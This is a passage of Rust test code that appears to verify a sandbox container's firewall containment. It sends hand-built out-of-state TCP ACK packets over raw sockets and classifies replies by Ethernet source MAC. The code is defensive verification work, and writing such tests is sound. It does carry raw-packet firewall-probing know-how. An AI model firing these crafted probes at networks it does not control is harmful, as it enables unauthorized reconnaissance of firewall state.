        "SECURE: sentry UDP non-DNS ports blocked — {} ports probed, all silent. DNS on :53 works.",
        probe_ports.len()
    ))
}

// ── Network path verification: conntrack_spoofed_ack ─────────

/// Provenance of a TCP response observed in reply to the spoofed lone ACK.
///
/// The sentry is the architecture's sole containment boundary: every packet
/// reaching the bottle is assumed to arrive via the bottle's gateway (the sentry
/// enclave interface). A reply is therefore a genuine containment breach only if
/// it crossed that boundary — i.e. its Ethernet source is the gateway MAC. A reply
/// from any other L2 source reached the bottle without traversing the sentry; that
/// is a network-substrate deviation (observed on Windows Docker Desktop, where the
/// host-side enclave gateway answers the out-of-state ACK itself), not a sentry
/// failure. We classify by L2 source rather than by L3, because the substrate
/// spoofs the destination IP either way — only the MAC distinguishes the two.
#[derive(Debug, PartialEq)]
enum AckProvenance {
    /// No reply within the window — sentry return-path state enforcement held.
    NoResponse,
    /// Reply arrived via the gateway (sentry) — a real containment breach.
    SentryMediated { src_mac: String },
    /// Reply arrived from a non-gateway L2 source — substrate injection, not a breach.
    OffPath { src_mac: String },
    /// Reply seen but the gateway MAC could not be resolved to confirm provenance.
    /// Reported conservatively as a breach so a real failure is never masked.
    Indeterminate { src_mac: String },
}

/// Outcome of inspecting one captured Ethernet frame against the probe's endpoints.
#[derive(Debug, PartialEq)]
enum FrameInspection {
    /// Our own outbound probe frame — carries the learned next-hop (gateway) MAC.
    Outbound { gateway_mac: String },
    /// The reply we are listening for, classified by L2 provenance.
    Reply(AckProvenance),
    /// Anything else — not relevant to this probe.
    Ignore,
}

/// Inspect a raw Ethernet frame: is it our outbound probe (learn the gateway MAC),
/// the reply we await (classify by L2 provenance), or irrelevant noise?
///
/// This is the load-bearing parse+classify core of the conntrack probe — the byte
/// offsets that locate the reply and the L2 compare that decides SentryMediated vs
/// OffPath. A silent break here (wrong offset, inverted compare) would mask a real
/// breach as SECURE, which is exactly the rot conntrack_spoofed_ack's verdict is
/// vulnerable to. Pure over the frame bytes so the pipeline self-check sortie can
/// exercise it with synthetic frames, no live socket required.
fn inspect_capture_frame(
    frame: &[u8],
    dst_addr: Ipv4Addr,
    bottle_addr: Ipv4Addr,
    gateway_mac: Option<&str>,
) -> FrameInspection {
    if frame.len() < 14 + 20 + 20 {
        return FrameInspection::Ignore; // too short for Ethernet + IPv4 + TCP
    }
    if frame[12] != 0x08 || frame[13] != 0x00 {
        return FrameInspection::Ignore; // not IPv4
    }
    let ihl = (frame[14] & 0x0f) as usize * 4;
    if ihl < 20 || 14 + ihl + 20 > frame.len() {
        return FrameInspection::Ignore;
    }
    if frame[14 + 9] != 6 {
        return FrameInspection::Ignore; // not TCP
    }
    let src_ip = Ipv4Addr::new(frame[26], frame[27], frame[28], frame[29]);
    let dst_ip = Ipv4Addr::new(frame[30], frame[31], frame[32], frame[33]);

    // Our own outbound ACK: learn the next-hop (gateway) MAC the kernel chose
    // (Ethernet destination of the frame we sent).
    if src_ip == bottle_addr && dst_ip == dst_addr {
        return FrameInspection::Outbound {
            gateway_mac: mac_to_string(&frame[0..6]),
        };
    }
    // The reply: from the probed destination, to the bottle. Classify by Ethernet
    // source against the gateway MAC.
    if src_ip == dst_addr && dst_ip == bottle_addr {
        let src_mac = mac_to_string(&frame[6..12]);
        return FrameInspection::Reply(match gateway_mac {
            Some(gw) if src_mac.eq_ignore_ascii_case(gw) => AckProvenance::SentryMediated { src_mac },
            Some(_) => AckProvenance::OffPath { src_mac },
            None => AckProvenance::Indeterminate { src_mac },
        });
    }
    FrameInspection::Ignore
}

/// Render a 6-byte MAC as lowercase colon-hex (matching /proc/net/arp form).
fn mac_to_string(b: &[u8]) -> String {
    b.iter()
        .map(|x| format!("{:02x}", x))
        .collect::<Vec<_>>()
        .join(":")
}

/// Parse a colon-hex MAC string into 6 bytes. Used only to assemble synthetic
/// frames for the pipeline self-check; returns zeroes for malformed input.
fn mac_from_string(s: &str) -> [u8; 6] {
    let mut out = [0u8; 6];
    for (i, part) in s.split(':').take(6).enumerate() {
        out[i] = u8::from_str_radix(part, 16).unwrap_or(0);
    }
    out
}

/// Resolve the MAC for `ip` from the kernel neighbor table (/proc/net/arp).
/// Returns None if absent or incomplete (all-zero).
fn arp_lookup_mac(ip: &str) -> Option<String> {
    let text = std::fs::read_to_string("/proc/net/arp").ok()?;
    // Columns: IP address  HW type  Flags  HW address  Mask  Device
    for line in text.lines().skip(1) {
        let cols: Vec<&str> = line.split_whitespace().collect();
        if cols.len() >= 4 && cols[0] == ip {
            let mac = cols[3].to_lowercase();
            if mac != "00:00:00:00:00:00" {
                return Some(mac);
            }
        }
    }
    None
}

/// Send a raw IP packet and listen at L2 (AF_PACKET) for a TCP reply from `dst`
/// to `bottle_ip`, classifying it by Ethernet source MAC against the gateway.
///
/// The gateway MAC is learned from the bottle's own outbound frame (the kernel's
/// chosen next hop for this exact packet — definitive), with the neighbor-table
/// entry for `gateway_ip` as a fallback. Requires CAP_NET_RAW (rbid carries it).
fn send_lone_ack_classify_provenance(
    packet: &[u8],
    dst: &str,
    bottle_ip: &str,
    gateway_ip: &str,
    timeout: Duration,
) -> Result<AckProvenance, String> {
    let dst_addr: Ipv4Addr = dst.parse().map_err(|e| format!("bad dst IP: {}", e))?;
    let bottle_addr: Ipv4Addr = bottle_ip.parse().map_err(|e| format!("bad bottle IP: {}", e))?;

    // L2 capture socket, opened BEFORE the send so the reply cannot race the listener.
    let proto = (0x0800u16).to_be() as libc::c_int; // htons(ETH_P_IP)
    let cap_fd = unsafe { libc::socket(libc::AF_PACKET, libc::SOCK_RAW, proto) };
    if cap_fd < 0 {
        return Err(format!("AF_PACKET socket: {}", std::io::Error::last_os_error()));
    }
    // RAII guard: always close the capture fd.
    struct Fd(libc::c_int);
    impl Drop for Fd {
        fn drop(&mut self) {
            unsafe { libc::close(self.0) };
        }
    }
    let _cap = Fd(cap_fd);

    // Send the lone ACK via an IP_HDRINCL raw socket — same egress path as any bottle
    // traffic, so the kernel routes it to the gateway (sentry).
    let send_sock = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_RAW as i32)),
    )
    .map_err(|e| format!("raw socket: {}", e))?;
    unsafe {
        let val: libc::c_int = 1;
        libc::setsockopt(
            send_sock.as_raw_fd(),
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &val as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        );
    }
    let sock_addr = socket2::SockAddr::from(SocketAddrV4::new(dst_addr, 0));
    send_sock
        .send_to(packet, &sock_addr)
        .map_err(|e| format!("sendto: {}", e))?;

    // Best-effort gateway MAC from the neighbor table (the send above triggers ARP if
    // it was not already cached; the bottle routes all traffic via the gateway anyway).
    let mut gateway_mac: Option<String> = arp_lookup_mac(gateway_ip);

    let mut buf = [0u8; 2048];
    let deadline = Instant::now() + timeout;
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        let tv = libc::timeval {
            tv_sec: remaining.as_secs() as libc::time_t,
            tv_usec: remaining.subsec_micros() as libc::suseconds_t,
        };
        if tv.tv_sec == 0 && tv.tv_usec == 0 {
            return Ok(AckProvenance::NoResponse);
        }
        unsafe {
            libc::setsockopt(
                cap_fd,
                libc::SOL_SOCKET,
                libc::SO_RCVTIMEO,
                &tv as *const _ as *const libc::c_void,
                std::mem::size_of::<libc::timeval>() as libc::socklen_t,
            );
        }
        let n = unsafe {
            libc::recv(cap_fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len(), 0)
        };
        if n < 0 {
            return Ok(AckProvenance::NoResponse); // timeout / EAGAIN
        }
        match inspect_capture_frame(&buf[0..n as usize], dst_addr, bottle_addr, gateway_mac.as_deref()) {
            // Our own outbound ACK taught us the gateway MAC — keep listening for the reply.
            FrameInspection::Outbound { gateway_mac: gw } => gateway_mac = Some(gw),
            FrameInspection::Reply(provenance) => return Ok(provenance),
            FrameInspection::Ignore => {}
        }
    }
}

pub fn sortie_conntrack_spoofed_ack(_extra_args: &[&str]) -> rbida_Verdict {
    let timeout = Duration::from_secs(3);

    // Bottle IP (raw packet source) and gateway IP (the sentry — the sole boundary).
    let bottle_ip = match env_require("RBRN_ENCLAVE_BOTTLE_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let gateway_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    // Resolve connectivity domain via getent to get an allowed-CIDR IP
    let resolve_output = match Command::new("getent")
        .args(["hosts", RBIDA_CONNECTIVITY_DOMAIN])
        .output()
    {
        Ok(o) => o,
        Err(e) => return fail(format!("ERROR: getent failed: {}", e)),
    };
    if !resolve_output.status.success() {
        return fail(format!("ERROR: cannot resolve {} (DNS blocked?)", RBIDA_CONNECTIVITY_DOMAIN));
    }
    let stdout = String::from_utf8_lossy(&resolve_output.stdout);
    let dst_ip = match stdout.split_whitespace().next() {
        Some(ip) => ip.to_string(),
        None => return fail("ERROR: getent returned empty output".to_string()),
    };

    // Build TCP ACK packet without prior SYN — a stateless mid-stream ACK to an
    // allowed host. A *sentry-forwarded* reply would mean the FORWARD
    // RELATED,ESTABLISHED rule admitted a reply to an unestablished flow.
    let tcp_ack = build_tcp_ack(40080, 80);
    let ip_hdr = match build_ip_header(6, &bottle_ip, &dst_ip, tcp_ack.len()) {
        Ok(h) => h,
        Err(e) => return fail(format!("ERROR: build IP header: {}", e)),
    };
    let mut packet = ip_hdr;
    packet.extend_from_slice(&tcp_ack);

    match send_lone_ack_classify_provenance(&packet, &dst_ip, &bottle_ip, &gateway_ip, timeout) {
        Ok(AckProvenance::NoResponse) => pass(format!(
            "SECURE: spoofed ACK to {}:80 drew no observed reply — no return path reached the bottle. \
             (Honest scope: this reflects observed silence, which a non-answering remote also produces; \
             it is not by itself proof the sentry dropped a reply. Capture/classify liveness — that a \
             real gateway-sourced reply WOULD be caught — is covered by conntrack-pipeline-selfcheck.)",
            dst_ip
        )),
        Ok(AckProvenance::SentryMediated { src_mac }) => fail(format!(
            "BREACH: spoofed ACK to {}:80 drew a sentry-forwarded reply (L2 src {} = gateway) — \
             FORWARD RELATED,ESTABLISHED admitted a reply to an unestablished flow",
            dst_ip, src_mac
        )),
        Ok(AckProvenance::OffPath { src_mac }) => pass(format!(
            "SECURE: spoofed ACK to {}:80 drew an OFF-PATH reply (L2 src {}, not the sentry gateway) — \
             network-substrate injection that bypassed the sentry, not a containment failure. \
             Known Windows Docker Desktop deviation; the sentry never forwarded a reply.",
            dst_ip, src_mac
        )),
        Ok(AckProvenance::Indeterminate { src_mac }) => fail(format!(
            "BREACH (provenance indeterminate): spoofed ACK to {}:80 drew a reply (L2 src {}) but the \
             gateway MAC could not be resolved to confirm it bypassed the sentry — reported conservatively",
            dst_ip, src_mac
        )),
        Err(e) => pass(format!(
            "SECURE: spoofed ACK to {}:80 blocked at socket level: {} (security posture intact)",
            dst_ip, e
        )),
    }
}

// ── Network path verification: offpath_blocked_dest ──────────

/// Forbidden destination for the off-path negative control: outside every
/// allowed CIDR on every platform (suite-wide convention, matches the forbidden
/// targets in net_forbidden_cidr / udp_non_dns_blocked / net_srcip_spoof).
const RBIDA_OFFPATH_BLOCKED_DEST: &str = "8.8.8.8";

/// Empirical backstop for the rbsq_wdd_offpath_reply quirk's keystone clause.
///
/// conntrack_spoofed_ack classifies an off-path lone-ACK reply as a benign
/// substrate quirk — but only on the untested premise that the substrate ever
/// answers egress the sentry *allowed*, because a blocked destination is dropped
/// at the sentry before the substrate sees it. This sortie tests that premise
/// directly: it fires the same provenance-classified lone ACK at a destination
/// the sentry never approved (8.8.8.8). Any reply at all — off-path or
/// sentry-mediated — is a BREACH, because the substrate reached the bottle on
/// behalf of an unapproved destination: a real path-in, not a quirk. Only
/// silence (the sentry dropped the egress) is SECURE.
pub fn sortie_offpath_blocked_dest(_extra_args: &[&str]) -> rbida_Verdict {
    let timeout = Duration::from_secs(3);

    // Bottle IP (raw packet source) and gateway IP (the sentry — the sole boundary).
    let bottle_ip = match env_require("RBRN_ENCLAVE_BOTTLE_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let gateway_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    // No DNS resolution: the destination is a literal blocked IP. Resolving a
    // forbidden host would itself be blocked, and the point is to probe egress to
    // a destination the sentry never approved — not to test name resolution.
    let dst_ip = RBIDA_OFFPATH_BLOCKED_DEST;

    // Same stateless mid-stream ACK as conntrack_spoofed_ack, but aimed at a
    // forbidden destination. A reply of ANY provenance proves the substrate
    // carried traffic for a destination the sentry never allowed.
    let tcp_ack = build_tcp_ack(40081, 80);
    let ip_hdr = match build_ip_header(6, &bottle_ip, dst_ip, tcp_ack.len()) {
        Ok(h) => h,
        Err(e) => return fail(format!("ERROR: build IP header: {}", e)),
    };
    let mut packet = ip_hdr;
    packet.extend_from_slice(&tcp_ack);

    match send_lone_ack_classify_provenance(&packet, dst_ip, &bottle_ip, &gateway_ip, timeout) {
        Ok(AckProvenance::NoResponse) => pass(format!(
            "SECURE: lone ACK to blocked {}:80 drew no reply — sentry dropped egress to an \
             unapproved destination before the substrate could answer; off-path premise holds",
            dst_ip
        )),
        Ok(AckProvenance::OffPath { src_mac }) => fail(format!(
            "BREACH: lone ACK to blocked {}:80 drew an OFF-PATH reply (L2 src {}, not the sentry \
             gateway) — the substrate answered for a destination the sentry never approved. This \
             voids the rbsq_wdd_offpath_reply benign classification: a real path-in, not a quirk.",
            dst_ip, src_mac
        )),
        Ok(AckProvenance::SentryMediated { src_mac }) => fail(format!(
            "BREACH: lone ACK to blocked {}:80 drew a sentry-forwarded reply (L2 src {} = gateway) \
             — the egress allowlist admitted traffic to a forbidden destination",
            dst_ip, src_mac
        )),
        Ok(AckProvenance::Indeterminate { src_mac }) => fail(format!(
            "BREACH (provenance indeterminate): lone ACK to blocked {}:80 drew a reply (L2 src {}) \
             but the gateway MAC could not be resolved — reported conservatively, since any reply \
             to a blocked destination is a breach regardless of path",
            dst_ip, src_mac
        )),
        Err(e) => pass(format!(
            "SECURE: lone ACK to blocked {}:80 blocked at socket level: {} (security posture intact)",
            dst_ip, e
        )),
    }
}

// ── Pipeline self-check: conntrack_pipeline_selfcheck ────────

/// Load-bearing negative control for the conntrack provenance pipeline.
///
/// conntrack_spoofed_ack's SECURE verdicts (NoResponse, and OffPath-suppressed)
/// are only trustworthy if the capture-parse + L2-classify path actually works —
/// a silently broken parser or an inverted MAC compare would turn a real breach
/// into a false SECURE. On Linux no real gateway-sourced reply can be produced
/// (the substrate never injects one; the firewall cannot fabricate one — the
/// spoofed ACK is conntrack-INVALID, so NAT/REJECT levers do not fire), so we
/// cannot stage an end-to-end breach here. Instead we feed inspect_capture_frame
/// — the exact code the live loop runs — synthetic frames with known provenance
/// and assert it classifies each correctly. If anyone breaks the offsets or the
/// compare, this goes red.
///
/// Scope, stated honestly: this proves the parse+classify stage is alive. It does
/// NOT exercise the live AF_PACKET socket read or the kernel egress path.
pub fn sortie_conntrack_pipeline_selfcheck(_extra_args: &[&str]) -> rbida_Verdict {
    // Synthetic, network-independent endpoints (TEST-NET-1 / RFC1918).
    let dst: Ipv4Addr = Ipv4Addr::new(192, 0, 2, 1);
    let bottle: Ipv4Addr = Ipv4Addr::new(10, 0, 0, 9);
    let gateway_mac = "aa:bb:cc:dd:ee:01";
    let off_path_mac = "aa:bb:cc:dd:ee:02";

    // Assemble an Ethernet+IPv4+TCP frame for a reply (dst -> bottle) with a chosen
    // L2 source, mirroring what the live socket would hand the parser.
    let make_reply = |l2_src_mac: &str| -> Vec<u8> {
        let tcp = build_tcp_ack(80, 40080);
        let ip = match build_ip_header(6, "192.0.2.1", "10.0.0.9", tcp.len()) {
            Ok(h) => h,
            Err(_) => Vec::new(),
        };
        let mut frame = Vec::with_capacity(14 + ip.len() + tcp.len());
        frame.extend_from_slice(&mac_from_string("00:11:22:33:44:55")); // Ethernet dst (bottle) — unchecked
        frame.extend_from_slice(&mac_from_string(l2_src_mac)); // Ethernet src — the provenance under test
        frame.extend_from_slice(&[0x08, 0x00]); // ethertype IPv4
        frame.extend_from_slice(&ip);
        frame.extend_from_slice(&tcp);
        frame
    };

    // Case 1 — the breach the live sortie must never miss: a reply whose L2 source
    // IS the gateway must classify SentryMediated.
    let f_gateway = make_reply(gateway_mac);
    match inspect_capture_frame(&f_gateway, dst, bottle, Some(gateway_mac)) {
        FrameInspection::Reply(AckProvenance::SentryMediated { .. }) => {}
        other => {
            return fail(format!(
                "BREACH (self-check failed): a gateway-sourced reply classified as {:?}, not SentryMediated \
                 — the conntrack capture/classify pipeline is broken and live SECURE verdicts cannot be trusted",
                other
            ))
        }
    }

    // Case 2 — the suppression arm: a reply from a non-gateway L2 source must
    // classify OffPath (this is the arm that turns a would-be breach into SECURE).
    let f_offpath = make_reply(off_path_mac);
    match inspect_capture_frame(&f_offpath, dst, bottle, Some(gateway_mac)) {
        FrameInspection::Reply(AckProvenance::OffPath { .. }) => {}
        other => {
            return fail(format!(
                "BREACH (self-check failed): an off-path reply classified as {:?}, not OffPath \
                 — the provenance suppression logic is wrong",
                other
            ))
        }
    }

    // Case 3 — conservative fallback: a reply with no known gateway MAC must
    // classify Indeterminate (reported as breach, never silently dropped).
    let f_indet = make_reply(gateway_mac);
    match inspect_capture_frame(&f_indet, dst, bottle, None) {
        FrameInspection::Reply(AckProvenance::Indeterminate { .. }) => {}
        other => {
            return fail(format!(
                "BREACH (self-check failed): an unresolved-gateway reply classified as {:?}, not Indeterminate",
                other
            ))
        }
    }

    // Case 4 — the outbound-learning branch: our own probe frame (bottle -> dst)
    // must be recognized as Outbound and teach the gateway MAC, not be mistaken
    // for a reply.
    let tcp_out = build_tcp_ack(40080, 80);
    let ip_out = match build_ip_header(6, "10.0.0.9", "192.0.2.1", tcp_out.len()) {
        Ok(h) => h,
        Err(e) => return fail(format!("ERROR: self-check could not build outbound frame: {}", e)),
    };
    let mut f_out = Vec::with_capacity(14 + ip_out.len() + tcp_out.len());
    f_out.extend_from_slice(&mac_from_string(gateway_mac)); // Ethernet dst = next hop (gateway)
    f_out.extend_from_slice(&mac_from_string("00:11:22:33:44:55")); // Ethernet src = bottle
    f_out.extend_from_slice(&[0x08, 0x00]);
    f_out.extend_from_slice(&ip_out);
    f_out.extend_from_slice(&tcp_out);
    match inspect_capture_frame(&f_out, dst, bottle, None) {
        FrameInspection::Outbound { gateway_mac: learned } if learned.eq_ignore_ascii_case(gateway_mac) => {}
        other => {
            return fail(format!(
                "BREACH (self-check failed): our own outbound probe classified as {:?}, not Outbound{{{}}} \
                 — gateway-MAC learning is broken",
                other, gateway_mac
            ))
        }
    }

    // Case 5 — noise rejection: a too-short / non-matching frame must be ignored.
    match inspect_capture_frame(&[0u8; 10], dst, bottle, Some(gateway_mac)) {
        FrameInspection::Ignore => {}
        other => {
            return fail(format!(
                "BREACH (self-check failed): a runt frame classified as {:?}, not Ignore",
                other
            ))
        }
    }

    pass(
        "SECURE: conntrack provenance pipeline self-check passed — parse+classify intact \
         (gateway->SentryMediated, off-path->OffPath, no-gateway->Indeterminate, outbound learned, runt ignored). \
         Scope: proves the classify stage is alive; does not exercise the live socket read."
            .to_string(),
    )
}
